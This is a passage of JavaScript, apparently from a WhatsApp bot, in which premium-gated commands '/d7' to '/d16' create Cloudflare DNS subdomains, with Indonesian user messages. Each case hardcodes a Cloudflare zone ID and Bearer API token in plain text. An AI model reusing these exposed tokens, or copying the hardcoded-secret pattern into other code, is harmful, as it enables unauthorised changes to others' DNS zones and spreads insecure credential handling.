        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/6283855410384")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "c2c8ddf4f1bfd0d0c11eb0ed83a634f9";
            let apitoken = "RHmElwWM5pEb3HsWi82uramdhi9wzDsaU8F9JV6F";
            let tld = "r0ulxye4.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break

      case '/d7': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "7432f024eeeaa0367fd985a18b2729cc";
            let apitoken = "RsbJAI6X7s7bPEj23R7sf28cqHibApP1EBSoF4FZ";
            let tld = "lanzpanel.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break

      case '/d8': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "891a2e5d4ac5b3db4fbcef8d9088ad38";
            let apitoken = "V2BCJ-jhHXQlkN5-_Jv-CuXEtJbLT9fo7NWAlMK2";
            let tld = "cpanel-vip.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break

      case '/d9': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "db100346b2f204bd967b0de85f47cb29";
            let apitoken = "Z2D888Bj-ozy4l6BOFP5bKeukzvTtdPEZGNgWDb4"
            let tld = "panellstore.icu";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break


      case '/d10': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "f60790b30c7d698b79fb148e53b9a6cf";
            let apitoken = "e3oy2YO_K2K6_pAoTzQhYVYNLiZfeAKRSwhSla1g"
            let tld = "panelmurah.cfd";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break

      case '/d11': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "03f3569e809aa63eb40d842af3ddb523";
            let apitoken = "kLS7qdEt9zuC9UJr2u5ok5LsPaKKk0p0vuuTgmEo"
            let tld = "panelprivv.xyz";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d12': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "5f4a582dd80c518fb2c7a425256fb491";
            let apitoken = "iQbJQgfe6kTyEfdOy_EV8UAHKj80VgQg4t6rTjby"
            let tld = "tokopanellku.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break


      case '/d13': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "15b97d8a42af1c00a70070e577ce7301";
            let apitoken = "RsbJAI6X7s7bPEj23R7sf28cqHibApP1EBSoF4FZ"
            let tld = "kiospanell.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break


      case '/d14': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "e60307683c18389584e9ae2f9fa707b2";
            let apitoken = "9hc8x5B4TewRTpXxETV_laVGksk3MyCfBXOgHgmg"
            let tld = "moon-offc.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break

      case '/d15': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/628856410394")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "ba364ec1df6998c10487aee2a61b7f0d";
            let apitoken = "hnM3i7bBHzcIRXqveYKR3KTnsfrkigkhar2vEUcP"
            let tld = "moon-offc.biz.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break


      case '/d16': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/6283856419394")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "84d35b1efa4fcdd32825bc887e83ba0c";
            let apitoken = "Ymf8GMTJO7AGeyMTFzoDx3d3vgW_FBiqL78b9O_S"
            let tld = "panellstore.site";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
